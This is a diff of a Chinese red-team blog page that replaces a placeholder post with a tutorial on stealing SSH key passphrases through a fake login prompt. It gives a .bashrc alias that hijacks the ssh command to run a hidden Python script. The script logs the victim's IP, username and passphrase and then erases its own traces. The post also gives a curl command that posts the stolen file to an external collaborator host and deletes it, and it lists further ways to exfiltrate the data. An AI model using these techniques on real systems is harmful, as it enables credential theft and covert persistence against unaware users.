@@ -17,21 +17,32 @@
   <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
   <meta name="theme-color" content="#f9fafb">
   
-  <title>通过社工获取SSH密钥文件密码 - 博客</title>
+  <title>水坑攻击获取SSH密钥文件密码 - 博客</title>
 
   
-    <meta name="description" content="as da s d">
+    <meta name="description" content="在2025年03月19日，遇到一个问题，如下：  思路 使用ssh2john针对密钥密码进行暴力破解。 重写ssh验证密码模块。 使用别名+脚本模拟ssh验证密码登录框。  这里我选择通过使用别名+脚本模拟ssh验证密码登录框，利用在ssh登录输入密码不可见的特性，利用受害者的心里，输入密码的时候以为是密码错误，进行水坑攻击。 别名+脚本模拟ssh验证密码登录框alias 命令用于创建命令的快捷方">
 <meta property="og:type" content="article">
-<meta property="og:title" content="通过社工获取SSH密钥文件密码">
+<meta property="og:title" content="水坑攻击获取SSH密钥文件密码">
 <meta property="og:url" content="http://example.com/posts/5181.html">
 <meta property="og:site_name" content="博客">
-<meta property="og:description" content="as da s d">
+<meta property="og:description" content="在2025年03月19日，遇到一个问题，如下：  思路 使用ssh2john针对密钥密码进行暴力破解。 重写ssh验证密码模块。 使用别名+脚本模拟ssh验证密码登录框。  这里我选择通过使用别名+脚本模拟ssh验证密码登录框，利用在ssh登录输入密码不可见的特性，利用受害者的心里，输入密码的时候以为是密码错误，进行水坑攻击。 别名+脚本模拟ssh验证密码登录框alias 命令用于创建命令的快捷方">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250319101311712.png">
+<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250319102625678.png">
+<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250319105125822.png">
+<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250319105557842.png">
+<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250319105709999.png">
+<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250319110049691.png">
+<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250319110403490.png">
+<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250319112407112.png">
+<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250319112824661.png">
+<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250319112434576.png">
 <meta property="article:published_time" content="2025-03-19T01:55:11.000Z">
-<meta property="article:modified_time" content="2025-03-19T02:09:10.034Z">
+<meta property="article:modified_time" content="2025-03-19T03:41:32.554Z">
 <meta property="article:author" content="弱鸡">
 <meta property="article:tag" content="红队">
-<meta name="twitter:card" content="summary">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250319101311712.png">
   
   
   
@@ -64,7 +75,7 @@
 <div class="widgets">
 
 
-<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/posts/5181.html"><span class="title">通过社工获取SSH密钥文件密码</span></a><a class="item title" href="/posts/33805.html"><span class="title">DarKnuclei 工具使用技巧</span></a><a class="item title" href="/posts/58642.html"><span class="title">Cobalt Strike主动识别方案</span></a><a class="item title" href="/posts/15280.html"><span class="title">测绘语法收集资产</span></a><a class="item title" href="/posts/24712.html"><span class="title">关于快速打点思考</span></a><a class="item title" href="/posts/16108.html"><span class="title">Hello World</span></a></div></widget>
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/posts/5181.html"><span class="title">水坑攻击获取SSH密钥文件密码</span></a><a class="item title" href="/posts/33805.html"><span class="title">DarKnuclei 工具使用技巧</span></a><a class="item title" href="/posts/58642.html"><span class="title">Cobalt Strike主动识别方案</span></a><a class="item title" href="/posts/15280.html"><span class="title">测绘语法收集资产</span></a><a class="item title" href="/posts/24712.html"><span class="title">关于快速打点思考</span></a><a class="item title" href="/posts/16108.html"><span class="title">Hello World</span></a></div></widget>
 </div>
 
 </div></aside><div class="l_main" id="main">
@@ -77,18 +88,125 @@
   <div class="content">
     <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
 <span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E7%A4%BE%E5%B7%A5/">社工</a></div>
-<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-03-19T01:55:11.000Z">2025-03-19</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-03-19T02:09:10.034Z">2025-03-19</time></span></div></div></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-03-19T01:55:11.000Z">2025-03-19</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-03-19T03:41:32.554Z">2025-03-19</time></span></div></div></div>
     
     <div class="bottom only-title">
       
       <div class="text-area">
-        <h1 class="text title"><span>通过社工获取SSH密钥文件密码</span></h1>
+        <h1 class="text title"><span>水坑攻击获取SSH密钥文件密码</span></h1>
         
       </div>
     </div>
     
   </div>
-  </div><article class="md-text content"><p>as da s d</p>
+  </div><article class="md-text content"><p>在2025年03月19日，遇到一个问题，如下：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250319101311712.png" alt="image-20250319101311712"></p>
+<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ol>
+<li>使用ssh2john针对密钥密码进行暴力破解。</li>
+<li>重写ssh验证密码模块。</li>
+<li>使用别名+脚本模拟ssh验证密码登录框。</li>
+</ol>
+<p>这里我选择通过使用别名+脚本模拟ssh验证密码登录框，利用在ssh登录输入密码不可见的特性，利用受害者的心里，输入密码的时候以为是密码错误，进行水坑攻击。</p>
+<h1 id="别名-脚本模拟ssh验证密码登录框"><a href="#别名-脚本模拟ssh验证密码登录框" class="headerlink" title="别名+脚本模拟ssh验证密码登录框"></a>别名+脚本模拟ssh验证密码登录框</h1><p><code>alias</code> 命令用于创建命令的快捷方式或别名，以便简化复杂的命令或减少重复输入。你可以通过 <code>alias</code> 将一个长的命令或常用的命令组合定义为一个简短的别名。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">alias</span> 别名=<span class="string">&#x27;命令&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>例如，如果你想将 <code>ls -la</code> 命令简化为 <code>ll</code>，可以这样做：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">alias</span> ll=<span class="string">&#x27;ls -la&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>之后，你只需输入 <code>ll</code>，系统就会执行 <code>ls -la</code>。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250319102625678.png" alt="image-20250319102625678"></p>
+<p>删除别名</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">unalias</span> ll</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h2><p>通过将python脚本设置为别名，将别名设置为<code>/root/.bashrc</code>中，设置为<code>Bash shell</code>加载，然后使用python模拟ssh认证输入密码，不管用户输入什么将一直报错，将得到的密码保存到本地，但是这里要考虑的问题：</p>
+<ol>
+<li>在通过python模拟ssh认证输入密码，alias如何删除？</li>
+<li>如何只使用一次模拟ssh认证？</li>
+<li>得到密钥之后当前文件怎么样删除？</li>
+</ol>
+<p>在下面代码中模拟的是在乌班图中验证ssh密码，设计思路：</p>
+<ol>
+<li><p>使用getpass模拟ssh输入密码，会出现以下三种情况：使用ssh_key认证，使用ssh_key认证但密钥不存在，使用密码登录。</p>
+<ol>
+<li><pre><code class="bash">root@ubuntu-linux-2404:/home/parallels# ssh -i ssh_key parallels@10.211.55.9
+Enter passphrase for key &#39;ssh_key&#39;: 
+Enter passphrase for key &#39;ssh_key&#39;: 
+Enter passphrase for key &#39;ssh_key&#39;: 
+parallels@10.211.55.9&#39;s password: 
+Permission denied, please try again.
+parallels@10.211.55.9&#39;s password: 
+Permission denied, please try again.
+parallels@10.211.55.9&#39;s password: 
+parallels@10.211.55.9: Permission denied (publickey,password).
+
+
+
+root@ubuntu-linux-2404:/home/parallels# ssh -i ssh_key parallels@10.211.55.9
+Warning: Identity file ssh_key not accessible: No such file or directory.
+parallels@10.211.55.9&#39;s password: 
+Permission denied, please try again.
+parallels@10.211.55.9&#39;s password: 
+Permission denied, please try again.
+parallels@10.211.55.9&#39;s password: 
+parallels@10.211.55.9: Permission denied (publickey,password).
+
+
+root@ubuntu-linux-2404:/home/parallels# ssh parallels@10.211.55.9
+parallels@10.211.55.9&#39;s password: 
+Permission denied, please try again.
+parallels@10.211.55.9&#39;s password: 
+Permission denied, please try again.
+parallels@10.211.55.9&#39;s password: 
+parallels@10.211.55.9: Permission denied (publickey,password).
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   2. 使用`sys.argv`捕捉后面的参数。</span><br><span class="line"></span><br><span class="line">   3. 使用异常模块捕捉ctr+c推出异常</span><br><span class="line"></span><br><span class="line">   4. 程序执行完成恢复/root/.bashrc文件，并删除别名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 实战测试</span><br><span class="line"></span><br><span class="line">别名设置：</span><br><span class="line"></span><br><span class="line">unalias ssh 删除别名，这个需要在python脚本前面，如果在后面python的sys捕捉不到命令参数。</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">alias ssh=&#x27;unalias ssh &gt; /dev/null 2&gt;&amp;1;python3 /tmp/test.py&#x27;</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ol>
+</li>
+</ol>
+<p>操作流程：</p>
+<p><code>vim /root/.bashrc</code>  最后一行： <code>alias ssh=&#39;unalias ssh &gt; /dev/null 2&gt;&amp;1;python3 /tmp/.test.py&#39;</code></p>
+<p>执行：<code>source /root/.bashrc</code></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250319105125822.png" alt="image-20250319105125822"></p>
+<p>执行 <code>vim /tmp/.test.py</code>，写入python文件</p>
+<p>python文件：<a target="_blank" rel="noopener" href="https://github.com/RuoJi6/script-demo/tree/main/python/alias_ssh">https://github.com/RuoJi6/script-demo/tree/main/python/alias_ssh</a></p>
+<h2 id="模拟受害者"><a href="#模拟受害者" class="headerlink" title="模拟受害者"></a>模拟受害者</h2><p>受害者在机器上登录指定机器，并输入密钥密码。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250319105557842.png" alt="image-20250319105557842"></p>
+<p>我们利用ssh输入密码特性看不见输入的密码，让受害者误以为是自己输入错误，从而让受害者一直输入密码。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250319105709999.png" alt="image-20250319105709999"></p>
+<p>当运行完成之后，受害者再次登录测试，就会发现登录成功。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250319110049691.png" alt="image-20250319110049691"></p>
+<h2 id="攻击者查看密码"><a href="#攻击者查看密码" class="headerlink" title="攻击者查看密码"></a>攻击者查看密码</h2><p><code>cat /tmp/.test</code></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250319110403490.png" alt="image-20250319110403490"></p>
+<p>就可以看到受害者输入的ip地址，用户名以及密码。</p>
+<h2 id="扩展思路"><a href="#扩展思路" class="headerlink" title="扩展思路"></a>扩展思路</h2><p>python模拟ssh终端，然后自身文件会删除，那&#x2F;tmp&#x2F;.test文件能不能通过http请求，发送到互联网，而不是保存在本地？</p>
+<p>思路：</p>
+<ol>
+<li>在自己服务器上开启一个http服务接收。</li>
+<li>使用dnslog接收。</li>
+<li>使用互联网泄露的邮箱接收。</li>
+<li>使用互联网泄露的OSS存储筒，通过未授权上传接收。</li>
+<li>使用未授权文件上传，发送时伪装成图片上传到别人网站上。</li>
+</ol>
+<h3 id="dnslog实验："><a href="#dnslog实验：" class="headerlink" title="dnslog实验："></a>dnslog实验：</h3><p>在下面代码中，我们读取文件，请求dnslog并将内容以post发送到dnslog中，并删除文件。</p>
+<p>我们把这行代码放在python末尾中。注意：这里需要使用burp suite的dnslog！！！</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.system(<span class="string">&#x27;curl -X POST -H &quot;Content-Type: text/plain&quot; -d &quot;$(cat /tmp/.test)&quot; http://b1d4m6en9eupxlam9dhcl5hmldr4fu3j.oastify.com/ &gt; /dev/null 2&gt;&amp;1;rm /tmp/.test&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="dnslog受害者"><a href="#dnslog受害者" class="headerlink" title="dnslog受害者"></a>dnslog受害者</h3><p>我们这里模拟受害者在进行输入的时候发现了异常，密码输入不正确，通过ctr+c终止输入的情况。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250319112407112.png" alt="image-20250319112407112"></p>
+<p>这里受害者通过ctr+c退出进程。</p>
+<p>如果受害者进行排查：</p>
+<ol>
+<li>觉得自己可能是输入错误。</li>
+<li>发现了异常，但是找不到异常地方以及文件。</li>
+</ol>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250319112824661.png" alt="image-20250319112824661"></p>
+<p>我们在burp suite上成功接收了来自服务器的ip地址，用户名以及密码。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250319112434576.png" alt="image-20250319112434576"></p>
 
 <div class="article-footer fs14">
     <section id="license">
@@ -113,7 +231,14 @@
 <footer class="page-footer footnote"><hr><div class="sitemap"><div class="sitemap-group"><span class="fs15">博客</span><a href="/">近期</a><a href="/categories/">分类</a><a href="/tags/">标签</a><a href="/archives/">归档</a></div><div class="sitemap-group"><span class="fs15">项目</span><a target="_blank" rel="noopener" href="https://github.com/RuoJi6/DarKnuclei">DarKnuclei</a><a target="_blank" rel="noopener" href="https://github.com/RuoJi6/xxl-job-FLM">xxl-job-FLM</a></div><div class="sitemap-group"><span class="fs15">更多</span><a href="/about/">关于我</a><a target="_blank" rel="noopener" href="https://github.com/RuoJi6">GitHub</a></div></div><div class="text"><p>本站由 <a href="/">弱鸡</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.29.1">Stellar 1.29.1</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
 </div></footer>
 <div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
-</aside><div class='float-panel blur'>
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-text">思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%AB%E5%90%8D-%E8%84%9A%E6%9C%AC%E6%A8%A1%E6%8B%9Fssh%E9%AA%8C%E8%AF%81%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95%E6%A1%86"><span class="toc-text">别名+脚本模拟ssh验证密码登录框</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF"><span class="toc-text">设计思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%8B%9F%E5%8F%97%E5%AE%B3%E8%80%85"><span class="toc-text">模拟受害者</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E6%9F%A5%E7%9C%8B%E5%AF%86%E7%A0%81"><span class="toc-text">攻击者查看密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A9%E5%B1%95%E6%80%9D%E8%B7%AF"><span class="toc-text">扩展思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dnslog%E5%AE%9E%E9%AA%8C%EF%BC%9A"><span class="toc-text">dnslog实验：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dnslog%E5%8F%97%E5%AE%B3%E8%80%85"><span class="toc-text">dnslog受害者</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer">
+
+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
   <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
     <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
   </button>
